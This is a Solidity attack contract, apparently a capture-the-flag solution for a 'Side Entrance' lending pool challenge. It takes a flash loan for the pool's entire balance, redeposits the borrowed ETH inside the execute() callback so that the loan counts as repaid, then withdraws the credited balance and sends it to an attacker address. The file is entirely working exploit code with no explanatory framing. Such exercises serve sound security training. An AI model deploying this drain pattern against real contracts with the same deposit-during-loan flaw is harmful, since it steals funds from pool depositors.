// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "@openzeppelin/contracts/utils/Address.sol";

import {IFlashLoanEtherReceiver, SideEntranceLenderPool} from "./SideEntranceLenderPool.sol";

contract SideEntraceAttacker {
    using Address for address payable;

    SideEntranceLenderPool private immutable pool;
    constructor(address payable poolAddress) {
        pool = SideEntranceLenderPool(poolAddress);
    }

    function drainPool(address payable _attackerAddress) external {
      uint256 poolBalance = address(pool).balance;

      // run flash loan
      pool.flashLoan(poolBalance);

      // take all the ETH
      pool.withdraw();

      // send to attacker address
      _attackerAddress.transfer(poolBalance);
    }

    function execute() payable external {
      // resend the ETH from flash loan
      pool.deposit{value: msg.value}();
    }

    receive() external payable {}
}